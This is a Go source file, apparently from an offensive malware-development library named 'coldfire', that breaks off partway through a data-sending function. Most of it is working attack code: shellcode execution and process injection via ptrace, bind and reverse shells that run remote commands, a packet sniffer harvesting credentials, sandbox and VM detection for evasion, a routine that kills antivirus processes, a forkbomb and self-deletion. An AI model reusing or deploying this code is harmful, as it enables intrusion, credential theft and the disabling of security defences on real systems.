package coldfire

/*
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#if defined(__x86_64)
#define REG_IP_NAME      "rip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).rip)
#elif defined(__i386)
#define REG_IP_NAME      "eip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).eip)
#endif
void sc_run(char *shellcode, size_t sclen) {
    void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    memcpy(ptr, shellcode, sclen);
    (*(void(*) ()) ptr)();
}
void sc_inject(char *shellcode, size_t sclen, pid_t pid) {
    struct user_regs_struct regs;
    int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    if (result < 0) { exit(1); }
    wait(NULL);
    result = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    if (result < 0) { exit(1); }
    int i;
    uint32_t *s = (uint32_t *) shellcode;
    uint32_t *d = (uint32_t *) REG_IP_VALUE(regs);

    for (i=0; i < sclen; i+=4, s++, d++) {
        result = ptrace(PTRACE_POKETEXT, pid, d, *s);
        if (result < 0) { exit(1); }
    }
    REG_IP_VALUE(regs) += 2;
}
*/
import "C"
import (
	"archive/zip"
	"unsafe"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"

	//"tawesoft.co.uk/go/dialog"
	"bufio"
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"reflect"
	"regexp"

	portscanner "github.com/anvie/port-scanner"

	//"syscall"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	humanize "github.com/dustin/go-humanize"
	"github.com/fatih/color"
	"github.com/matishsiao/goInfo"
	"github.com/minio/minio/pkg/disk"
	ps "github.com/mitchellh/go-ps"
	//wapi "github.com/iamacarpet/go-win64api"
)

var red = color.New(color.FgRed).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var cyan = color.New(color.FgBlue).SprintFunc()
var bold = color.New(color.Bold).SprintFunc()
var yellow = color.New(color.FgYellow).SprintFunc()

func Revert(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

func IpIncrement(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
func _kill_proc_by_pid(pid int) error {
	cmd := ""
	p := strconv.Itoa(pid)
	switch runtime.GOOS {
	case "windows":
		cmd = "taskkill /F /PID " + p
	case "linux":
		cmd = "kill -9 " + p
	default:
		cmd = "kill " + p
	}
	_, err := CmdOut(cmd)
	return err
}

func _handle_bind(conn net.Conn) {
	for {
		buffer := make([]byte, 1024)
		length, _ := conn.Read(buffer)
		command := string(buffer[:length-1])
		out, _ := CmdOut(command)
		/*parts := strings.Fields(command)
		  head := parts[0]
		  parts = parts[1:len(parts)]
		  out, _ := exec.Command(head,parts...).Output()*/
		conn.Write([]byte(out))
	}
	conn.Close()
}

func _handle_reverse(conn net.Conn) {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func _get_ntp_time() time.Time {
	type ntp struct {
		FirstByte, A, B, C uint8
		D, E, F            uint32
		G, H               uint64
		ReceiveTime        uint64
		J                  uint64
	}
	sock, _ := net.Dial("udp", "us.pool.ntp.org:123")
	sock.SetDeadline(time.Now().Add((2 * time.Second)))
	defer sock.Close()
	transmit := new(ntp)
	transmit.FirstByte = 0x1b
	binary.Write(sock, binary.BigEndian, transmit)
	binary.Read(sock, binary.BigEndian, transmit)
	return time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((transmit.ReceiveTime >> 32) * 1000000000)))
}

func _sleep(seconds int, endSignal chan<- bool) {
	time.Sleep(time.Duration(seconds) * time.Second)
	endSignal <- true
}

func f(str string, arg ...interface{}) string {
	return fmt.Sprintf(str, arg...)
}

func print_good(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", green(t), green(bold("[+]")), msg)
}

func print_info(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] [*] :: %s", t, msg)
}

func print_error(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", red(t), red(bold("[x]")), msg)
}

func print_warning(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", yellow(t), yellow(bold("[!]")), msg)
}

func file_to_slice(file string) []string {
	fil, _ := os.Open(file)
	defer fil.Close()
	var lines []string
	scanner := bufio.NewScanner(fil)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

func contains(s interface{}, elem interface{}) bool {
	arrV := reflect.ValueOf(s)
	if arrV.Kind() == reflect.Slice {
		for i := 0; i < arrV.Len(); i++ {
			if arrV.Index(i).Interface() == elem {
				return true
			}
		}
	}
	return false
}

func str_to_int(string_integer string) int {
	//i, _ := strconv.ParseInt(string_integer, 10, 32)
	i, _ := strconv.Atoi(string_integer)
	return i
}

func str_to_words(s string) []string {
	words := []string{}
	gr := strings.Split(s, " ")
	for x := range gr {
		z := gr[x]
		if len(z) != 0 {
			words = append(words, z)
		}
	}
	return words
}

func int_to_str(i int) string {
	return strconv.Itoa(i)
}

func size_to_bytes(size string) int {
	period_letter := string(size[len(size)-1])
	intr := string(size[:len(size)-1])
	i, _ := strconv.Atoi(intr)
	switch period_letter {
	case "g":
		return i * 1024 * 1024 * 1024
	case "m":
		return i * 1024 * 1024
	case "k":
		return i * 1024
	}
	return i
}

func alloc(size string) {
	_ = make([]byte, size_to_bytes(size))
}

func interval_to_seconds(interval string) int {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.Atoi(intr)
	switch period_letter {
	case "s":
		return i
	case "m":
		return i * 60
	case "h":
		return i * 3600
	}
	return i
}

func gen_cpu_load(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundresOfMicrosecond := 1000
	runMicrosecond := unitHundresOfMicrosecond * percentage
	//sleepMicrosecond := unitHundresOfMicrosecond*100 - runMicrosecond
	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Now().Sub(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}
	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

func RandomInt(min int, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min) + min
}

func RandomSelectStr(list []string) string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

func RandomSelectStrNested(list [][]string) []string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

func random_select_int(list []int) int {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

func remove_newlines(s string) string {
	re := regexp.MustCompile(`\r?\n`)
	s = re.ReplaceAllString(s, " ")
	return s
}

func full_remove(str string, to_remove string) string {
	return strings.Replace(str, to_remove, "", -1)
}

func remove_duplicates_str(slice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func remove_duplicates_int(slice []int) []int {
	keys := make(map[int]bool)
	list := []int{}
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func contains_any(str string, elements []string) bool {
	for element := range elements {
		e := elements[element]
		if strings.Contains(str, e) {
			return true
		}
	}
	return false
}

func random_string(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func ExitOnError(e error) {
	if e != nil {
		print_error(e.Error())
		os.Exit(0)
	}
}

func RemoveFromSlice(slice []string, element string) []string {
	res := []string{}
	for _, e := range slice {
		if e != element {
			res = append(res, e)
		}
	}
	return res
}

func shellcode_run(shellcode []byte) error {
	switch runtime.GOOS {
	case "windows":
		return errors.New("syscall module works like shit - we will try to implement Windows shellcode runner differently")
		/*kernel32 := syscall.NewLazyDLL("kernel32.dll")
		  ntdll := syscall.NewLazyDLL("ntdll.dll")
		  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
		  RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
		  const MEM_COMMIT = 0x1000
		  const MEM_RESERVE = 0x2000
		  const PAGE_EXECUTE_READWRITE = 0x40
		  addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		  if err != nil {
		      return err
		  }
		  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
		  syscall.Syscall(addr, 0, 0, 0, 0)*/
	default:
		C.sc_run((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)))
	}
	return nil
}

func shellcode_inject(shellcode []byte, pid int) error {
	switch runtime.GOOS {
	case "windows":
		return errors.New("syscall module works like shit - we will try to implement Windows shellcode injector differently")
		/*kernel32 := syscall.NewLazyDLL("kernel32.dll")
		  OpenProcess := kernel32.NewProc("OpenProcess")
		  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
		  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
		  CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
		  const PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
		  const MEM_COMMIT = 0x1000
		  const MEM_RESERVE = 0x2000
		  const PAGE_EXECUTE_READWRITE = 0x40
		  proc_handle, _, err := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
		  if err != nil {
		      return err
		  }
		  remote_buf, _, err := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		  if err != nil {
		      return err
		  }
		  WriteProcessMemory.Call(proc_handle, remote_buf, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
		  CreateRemoteThread.Call(proc_handle, 0, 0, remote_buf, 0, 0, 0)*/
	default:
		C.sc_inject((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)), (C.pid_t)(pid))
	}
	return nil
}

func GetLocalIp() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP
	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func GetGlobalIp() string {
	ip := ""
	resolvers := []string{"https://api.ipify.org?format=text",
		"http://myexternalip.com/raw",
		"http://ident.me"}
	for {
		url := RandomSelectStr(resolvers)
		resp, _ := http.Get(url)
		/*if err != nil{
		    print_warning(err.Error())
		}*/
		defer resp.Body.Close()
		i, _ := ioutil.ReadAll(resp.Body)
		ip = string(i)
		if resp.StatusCode == 200 {
			break
		}
	}
	return ip
}

func iface() (string, string) {
	addrs, err := net.InterfaceAddrs()
	_ = addrs
	ExitOnError(err)
	current_iface := ""
	interfaces, _ := net.Interfaces()
	for _, interf := range interfaces {
		if addrs, err := interf.Addrs(); err == nil {
			for _, addr := range addrs {
				if strings.Contains(addr.String(), GetLocalIp()) {
					current_iface = interf.Name
				}
			}
		}
	}
	netInterface, err := net.InterfaceByName(current_iface)
	ExitOnError(err)

	name := netInterface.Name
	macAddress := netInterface.HardwareAddr
	hwAddr, err := net.ParseMAC(macAddress.String())
	ExitOnError(err)
	return name, hwAddr.String()
}

func ifaces() []string {
	ifs := []string{}
	interfaces, _ := net.Interfaces()
	for _, interf := range interfaces {
		ifs = append(ifs, interf.Name)
	}
	return ifs
}

func info() map[string]string {
	_, mac := iface()
	u := ""
	ap_ip := ""
	i := goInfo.GetInfo()
	switch runtime.GOOS {
	case "windows":
		user, err := CmdOut("query user")
		if err != nil {
			user = "N/A"
		}
		u = user

		o, err := CmdOut("ipconfig")
		if err != nil {
			ap_ip = "N/A"
		}
		entries := strings.Split(o, "\n")
		for e := range entries {
			entry := entries[e]
			if strings.Contains(entry, "Default") {
				ap_ip = strings.Split(entry, ":")[1]
			}
		}
	default:
		user, err := CmdOut("whoami")
		if err != nil {
			user = "N/A"
		}
		u = user

		o, err := CmdOut("ip r")
		if err != nil {
			ap_ip = "N/A"
		}
		entries := strings.Split(o, "\n")
		for e := range entries {
			entry := entries[e]
			if strings.Contains(entry, "default via") {
				ap_ip = strings.Split(o, "")[2]
			}
		}
	}
	inf := map[string]string{
		"username":  u,
		"hostname":  fmt.Sprintf("%v", i.Hostname),
		"go_os":     fmt.Sprintf("%v", i.GoOS),
		"os":        fmt.Sprintf("%v", i.OS),
		"platform":  fmt.Sprintf("%v", i.Platform),
		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
		"kernel":    fmt.Sprintf("%v", i.Kernel),
		"core":      fmt.Sprintf("%v", i.Core),
		"local_ip":  GetLocalIp(),
		"global_ip": GetGlobalIp(),
		"ap_ip":     ap_ip,
		"mac":       mac,
	}
	return inf
}

func md5_hash(str string) string {
	hasher := md5.New()
	hasher.Write([]byte(str))
	return hex.EncodeToString(hasher.Sum(nil))
}

func create_wordlist(words []string) []string {
	wordlist := []string{}
	for w := range words {
		word := words[w]
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, Revert(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
	}
	return wordlist
}

func read_file(filename string) (string, error) {
	fil, err := os.Open(filename)
	defer fil.Close()
	b, err := ioutil.ReadAll(fil)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func write_file(filename, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}
	return nil
}

func files_pattern(directory, pattern string) (map[string]string, error) {
	out_map := map[string]string{}
	files, err := ioutil.ReadDir(directory)
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		fl, err := read_file(f.Name())
		if err != nil {
			return nil, err
		}
		if strings.Contains(fl, pattern) {
			out_map[f.Name()], err = read_file(f.Name())
			if err != nil {
				return nil, err
			}
		}
	}
	return out_map, nil
}

func B64D(str string) string {
	raw, _ := base64.StdEncoding.DecodeString(str)
	return fmt.Sprintf("%s", raw)
}

func B64E(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func wait(interval string) {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.ParseInt(intr, 10, 64)
	var x int64
	switch period_letter {
	case "s":
		x = i
	case "m":
		x = i * 60
	case "h":
		x = i * 3600
	}
	time.Sleep(time.Duration(x) * time.Second)
}

/*func file_info(file string) map[string]string {
    inf, err := os.Stat(file)
    return map[string]string{

    }
}*/

func Forkbomb() {
	go Forkbomb()
}

func Remove() {
	os.Remove(os.Args[0])
}

func Exists(file string) bool {
	_, err := os.Stat(file)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func IsRoot() bool {
	root := true
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil {
			root = false
		}
	default:
		u, _ := CmdOut("whoami")
		if strings.Contains(u, "root") {
			root = true
		}
	}
	return root
}

func CmdOut(command string) (string, error) {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd", "/C", command)
		//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.CombinedOutput()
		out := string(output)
		return out, err
	case "linux":
		cmd := exec.Command("bash", "-c", command)
		output, err := cmd.CombinedOutput()
		out := string(output)
		return out, err
	default:
		parts := strings.Fields(command)
		head := parts[0]
		parts = parts[1:len(parts)]
		cmd := exec.Command(head, parts...)
		output, err := cmd.CombinedOutput()
		out := string(output)
		return out, err
	}
}

/*func cmd_out_ssh(address, username, password, command string) (string, error) {
    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
    }
    client, err := ssh.Dial("tcp", address, config)
    if err != nil {
        return "", err
    }
    session, err := client.NewSession()
    if err != nil {
        return "", err
    }
    defer session.Close()
    var b bytes.Buffer
    session.Stdout = &b
    err = session.Run(command)
    return b.String(), err
}*/

func CmdOutPlatform(commands map[string]string) (string, error) {
	cmd := commands[runtime.GOOS]
	out, err := CmdOut(cmd)
	if err != nil {
		return "", err
	}
	return out, nil
}

func CmdRun(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]
	cmd := exec.Command(head, parts...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		print_error(err.Error())
		fmt.Println(string(output))
		//fmt.Println(red(err.Error()) + ": " + string(output))
	} else {
		fmt.Println(string(output))
	}
	//ExitOnError("[COMMAND EXEC ERROR]", err)
}

func CmdBlind(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]
	cmd := exec.Command(head, parts...)
	_, _ = cmd.CombinedOutput()
	//ExitOnError("[COMMAND EXEC ERROR]", err)
}

func CmdDir(dirs_cmd map[string]string) ([]string, error) {
	outs := []string{}
	for dir, cmd := range dirs_cmd {
		err := os.Chdir(dir)
		if err != nil {
			return nil, err
		}
		o, err := CmdOut(cmd)
		if err != nil {
			return nil, err
		}
		outs = append(outs, o)
	}
	return outs, nil
}

func MakeZip(zip_file string, files []string) error {
	newZipFile, err := os.Create(zip_file)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()
	for _, file := range files {
		fileToZip, err := os.Open(file)
		if err != nil {
			return err
		}
		defer fileToZip.Close()
		info, err := fileToZip.Stat()
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = file
		header.Method = zip.Deflate
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, fileToZip)
		if err != nil {
			return err
		}
	}
	return nil
}

func CredentialsSniff(ifac, interval string,
	collector chan string,
	words []string) error {
	ifs := []string{}
	if ifac != "all" {
		ifs = []string{ifac}
	} else {
		for _, i := range ifs {
			ifs = append(ifs, i)
		}
	}
	hits := []string{"password", "user",
		"username", "secrets", "auth"}
	for w := range words {
		word := words[w]
		hits = append(hits, word)
	}
	for h := range hits {
		hit := hits[h]
		hits = append(hits, strings.ToUpper(hit))
		hits = append(hits, strings.ToUpper(string(hit[0]))+string(hit[1:]))
	}
	var snapshot_len int32 = 1024
	var timeout time.Duration = time.Duration(interval_to_seconds(interval)) * time.Second
	for _, i := range ifs {
		handler, err := pcap.OpenLive(i, snapshot_len, false, timeout)
		if err != nil {
			return err
		}
		defer handler.Close()
		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for p := range source.Packets() {
			app_layer := p.ApplicationLayer()
			pay := app_layer.Payload()
			for h := range hits {
				hit := hits[h]
				if bytes.Contains(pay, []byte(hit)) {
					collector <- string(pay)
				}
			}
		}
	}
	return nil
}

func SandboxFilepath() bool {
	if runtime.GOOS == "linux" {
		return false
	}
	EvidenceOfSandbox := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
		}
	}
	if len(EvidenceOfSandbox) == 0 {
		return false
	} else {
		return true
	}
}

func SandboxProc() bool {
	sandbox_processes := []string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
		`vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`,
		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
	p, _ := Processes()
	for _, name := range p {
		if contains_any(name, sandbox_processes) {
			return true
		}
	}
	return false
}

func SandboxSleep() bool {
	z := false
	firstTime := _get_ntp_time()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := _get_ntp_time()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

func SandboxDisk(size int) bool {
	v := false
	d := "/"
	switch runtime.GOOS {
	case "windows":
		d = `C:\`
	}
	di, _ := disk.GetInfo(d)
	x := strings.Replace(humanize.Bytes(di.Total), "GB", "", -1)
	x = strings.Replace(x, " ", "", -1)
	z, err := strconv.Atoi(x)
	if err != nil {
		fmt.Println(err)
	}
	if z < size {
		v = true
	}
	return v
}

func SandboxCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

func SandboxRam(ram_mb int) bool {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	rmb := uint64(ram_mb)
	ram := m.TotalAlloc / 1024 / 1024
	if ram < rmb {
		return true
	}
	return false
}

func SandboxUtc() bool {
	_, offset := time.Now().Zone()
	if offset == 0 {
		return true
	} else {
		return false
	}
}

func SandboxProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}
	if len(processes) < proc_num {
		return true
	}
	return false
}

func SandboxTmp(entries int) bool {
	tmp_dir := "/tmp"
	if runtime.GOOS == "windows" {
		tmp_dir = `C:\windows\temp`
	}
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}
	if len(files) < entries {
		return true
	}
	return false
}

func SandboxMac() bool {
	hits := 0
	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
		`00:50:56`, `00:05:69`, `08:00:27`}
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		for _, mac := range sandbox_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}
	if hits == 0 {
		return true
	}
	return false
}

func SandboxAll() bool {
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxDisk(50),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxProcnum(100),
		SandboxRam(2048),
		SandboxUtc(),
	}
	for s := range values {
		x := values[s]
		if x {
			return true
		}
	}
	return false
}

func SandboxAlln(num int) bool {
	num_detected := 0
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxDisk(50),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxTmp(100),
		SandboxRam(2048),
		SandboxMac(),
		SandboxUtc(),
	}
	for s := range values {
		x := values[s]
		if x {
			num_detected += 1
		}
	}
	if num_detected >= num {
		return true
	}
	return false
}

func Shutdown() error {
	commands := map[string]string{
		"windows": "shutdown -s -t 60",
		"linux":   "shutdown +1",
		"darwin":  "shutdown -h +1",
	}
	c := commands[runtime.GOOS]
	_, err := CmdOut(c)
	return err
}

/*func set_ttl(interval string){
    endSignal := make(chan bool, 1)
    go _sleep(interval_to_seconds(interval), endSignal)
    select {
    case <-endSignal:
        remove()
        os.Exit(0)
    }
}*/

/*func SetTTL(duration string) {
	c := cron.New()
	c.AddFunc("@every "+duration, remove)
	c.Start()
}*/

func Bind(port int) {
	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	ExitOnError(err)
	defer listen.Close()
	for {
		conn, err := listen.Accept()
		if err != nil {
			print_error("Cannot bind to selected port")
		}
		_handle_bind(conn)
	}
}

func Reverse(host string, port int) {
	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	ExitOnError(err)
	for {
		_handle_reverse(conn)
	}
}

func PkillPid(pid int) error {
	err := _kill_proc_by_pid(pid)
	return err
}

func PkillName(name string) error {
	processList, err := ps.Processes()
	if err != nil {
		return err
	}
	for x := range processList {
		var process ps.Process
		process = processList[x]
		proc_name := process.Executable()
		pid := process.Pid()
		if strings.Contains(proc_name, name) {
			err := _kill_proc_by_pid(pid)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func PkillAv() error {
	av_processes := []string{}
	windows_av_processes := []string{
		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}
	unix_av_processes := []string{"netsafety"}
	if runtime.GOOS == "windows" {
		av_processes = windows_av_processes
	} else {
		av_processes = unix_av_processes
	}
	processList, err := ps.Processes()
	if err != nil {
		return err
	}
	for x := range processList {
		var process ps.Process
		process = processList[x]
		proc_name := process.Executable()
		pid := process.Pid()
		if contains_any(proc_name, av_processes) {
			err := _kill_proc_by_pid(pid)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}
	for x := range processList {
		var process ps.Process
		process = processList[x]
		prs[process.Pid()] = process.Executable()
	}
	return prs, nil
}

func Portscan(target string, timeout, threads int) []int {
	pr := []int{}
	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
	opened_ports := ps.GetOpenedPort(0, 65535)
	for p := range opened_ports {
		port := opened_ports[p]
		pr = append(pr, port)
	}
	return pr
}

func PortscanSingle(target string, port int) bool {
	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
	opened_ports := ps.GetOpenedPort(port-1, port+1)
	if len(opened_ports) != 0 {
		return true
	}
	return false
}

func BannerGrab(target string, port int) (string, error) {
	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
	if err != nil {
		return "", err
	}
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(time.Second * 5))
	n, err := conn.Read(buffer)
	if err != nil {
		return "", err
	}
	banner := buffer[0:n]
	return string(banner), nil
}

func SendDataTCP(host string, port int, data string) error {
	addr := host + ":" + strconv.Itoa(port)
